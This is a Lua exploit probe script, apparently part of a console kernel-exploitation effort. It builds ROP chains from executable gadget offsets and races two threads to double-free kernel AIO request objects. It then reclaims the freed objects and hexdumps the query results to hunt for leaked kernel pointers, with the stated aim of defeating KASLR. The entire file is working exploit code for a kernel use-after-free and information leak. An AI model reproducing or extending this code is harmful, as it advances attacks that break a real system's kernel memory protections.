-- CRASH_CLASS: HIGH
-- PROBE 69a: AIO self-overlap with full hexdump of anomalous wait/poll values
--
-- 65p confirmed AIO self-overlap (killed=6/6, wait_anom=6) but never printed
-- the anomalous wait values. If those values contain kernel pointer fragments
-- (0xFFFF8xxx range), it's instant KASLR defeat.
--
-- This probe reproduces 65p's self-overlap and prints EVERY returned value
-- from 663/664 in full hex (hi:lo) for overlap IDs.

print("=== PROBE 69a: AIO overlap hexdump ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSYS, SIGSEGV, SIGBUS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

-- Read QWORD from the status buffer after 663 — captures full 8 bytes
local function wait_one_qword(id)
    wd(N(one_id), id)
    wq(N(one_st), uint64(0xDEADDEAD))
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rq(N(one_st))
end

-- Read QWORD from the status buffer after 664 — captures full 8 bytes
local function poll_one_qword(id)
    wd(N(one_id), id)
    wq(N(one_st), uint64(0xDEADDEAD))
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rq(N(one_st))
end

-- Also read via 666 and 667
local function query_666(id)
    wd(N(one_id), id)
    wq(N(one_st), uint64(0xDEADDEAD))
    pcall(function()
        mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rq(N(one_st))
end

local function query_667(id)
    local buf = memory.alloc(0x20)
    for i = 0, 0x1C, 4 do wd(N(buf) + i, 0xDEAD) end
    wd(N(one_id), id)
    pcall(function()
        mk(667)(uint64(N(one_id)), uint64(1), uint64(N(buf)))
    end)
    return rq(N(buf)), rq(N(buf) + 8)
end

-- Build delete child (from 65p)
local function build_delete_child(del_ids_addr, count, states_addr)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(del_ids_addr))
    emit(g_pop_rsi); emit(uint64(count))
    emit(g_pop_rdx); emit(uint64(states_addr))
    emit(g_pop_rax); emit(uint64(662))
    emit(stub)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431))
    emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    return par
end

local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

-- [A] Baseline: normal values for 663/664/666/667
print("[A] Baseline: normal query values (no double-free)")
do
    local ids = {}
    for i = 1, 4 do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    for _, id in ipairs(ids) do
        local w = wait_one_qword(id)
        local p = poll_one_qword(id)
        local s6 = query_666(id)
        local s7a, s7b = query_667(id)
        print(string.format("  id=0x%X 663=%s 664=%s 666=%s 667=[%s,%s]",
            id, fmt(w), fmt(p), fmt(s6), fmt(s7a), fmt(s7b)))
    end
    for _, id in ipairs(ids) do delete_one(id) end
    -- Also query deleted IDs
    if #ids > 0 then
        local w = wait_one_qword(ids[1])
        local p = poll_one_qword(ids[1])
        print(string.format("  DELETED id=0x%X 663=%s 664=%s", ids[1], fmt(w), fmt(p)))
    end
end

if not alive() then print("DEAD after baseline"); return end

-- [B] Double-free + self-reclaim + FULL HEXDUMP of all queries
print("")
print("[B] Double-free → self-reclaim → query hexdump")

local ITERS = 15
local total_anomalies = 0
local kptr_found = false

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); table.insert(ids, id) end
    end
    local count = #ids
    if count < 8 then
        print(string.format("  iter %d: only %d IDs, skip", iter, count))
        break
    end

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    local par_A = build_delete_child(N(del_ids), count, N(states_A))
    local par_B = build_delete_child(N(del_ids), count, N(states_B))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(del_ids)) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  iter %d: CRASHED (doubles=%d)", iter, doubles))
        break
    end

    if doubles == 0 then
        if iter <= 2 then print(string.format("  iter %d: 0 doubles", iter)) end
    else
        -- Reclaim: submit new AIO requests
        local new_count = doubles * 2 + 8
        if new_count > 48 then new_count = 48 end
        local new_ids = {}
        for i = 1, new_count do
            local nid = submit_one()
            if nid ~= 0 then table.insert(new_ids, nid) end
        end
        for _, nid in ipairs(new_ids) do poll_one(nid) end

        -- Delete first half
        local half = math.floor(#new_ids / 2)
        for i = 1, half do delete_one(new_ids[i]) end

        if not alive() then
            print(string.format("  iter %d: CRASHED during cross-delete (doubles=%d)", iter, doubles))
            break
        end

        -- NOW THE KEY: query remaining IDs with FULL HEX OUTPUT
        local iter_anomalies = 0
        local killed = 0
        for i = half + 1, #new_ids do
            local nid = new_ids[i]
            local w = wait_one_qword(nid)
            local p = poll_one_qword(nid)
            local s6 = query_666(nid)

            local wh, wl = get_hi_lo(w)
            local ph, pl = get_hi_lo(p)

            -- Check for anomalous values (not 0, not 0xDEAD, not standard status)
            local w_anom = (wl ~= 0 and wl ~= 0xDEAD and wl ~= 0xDEADDEAD)
            local p_anom = (pl ~= 0 and pl ~= 0xDEAD and pl ~= 0xDEADDEAD)

            -- Check for kernel pointer in hi word
            local w_kptr = (wh >= 0xFFFF8000)
            local p_kptr = (ph >= 0xFFFF8000)

            if w_anom or p_anom or w_kptr or p_kptr then
                iter_anomalies = iter_anomalies + 1
                total_anomalies = total_anomalies + 1
                print(string.format("  iter %d id=0x%X: 663=%s 664=%s 666=%s%s",
                    iter, nid, fmt(w), fmt(p), fmt(s6),
                    (w_kptr or p_kptr) and " *** KERNEL POINTER ***" or " (anomaly)"))
                if w_kptr or p_kptr then kptr_found = true end
            end

            -- Also check if ID was killed by partner deletion
            local pst = rd(N(one_st)) or 0xDEAD
            if pst ~= 0 and pst ~= 0xDEADDEAD then
                killed = killed + 1
            end
        end

        -- Clean up remaining
        for i = half + 1, #new_ids do
            pcall(function() delete_one(new_ids[i]) end)
        end

        local tag = ""
        if killed > 0 then tag = " *** OVERLAP ***" end
        if iter_anomalies > 0 then tag = tag .. " ANOMALIES=" .. iter_anomalies end
        print(string.format("  iter %d: doubles=%d new=%d killed=%d anom=%d%s",
            iter, doubles, #new_ids, killed, iter_anomalies, tag))
    end
end

-- [C] Also test class=2 and class=3 submits (GAP A from verification)
print("")
print("[C] AIO class=2 and class=3 lifecycle test")
for cls = 1, 3 do
    if not alive() then break end
    wd(N(one_id), 0)
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    local ret = -1
    pcall(function()
        ret = N(mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(cls), uint64(N(one_id))))
    end)
    local id = rd(N(one_id)) or 0
    print(string.format("  class=%d: ret=%d id=0x%X", cls, ret, id))
    if id ~= 0 then
        local pst = poll_one(id)
        local w = wait_one_qword(id)
        print(string.format("    poll=0x%X 663=%s", pst, fmt(w)))
        delete_one(id)
    end
end

print("")
print(string.format("TOTAL anomalies across all iters: %d", total_anomalies))
if kptr_found then
    print("*** KERNEL POINTER DETECTED — KASLR DEFEAT ***")
end
print("")
print("=== PROBE 69a COMPLETE ===")
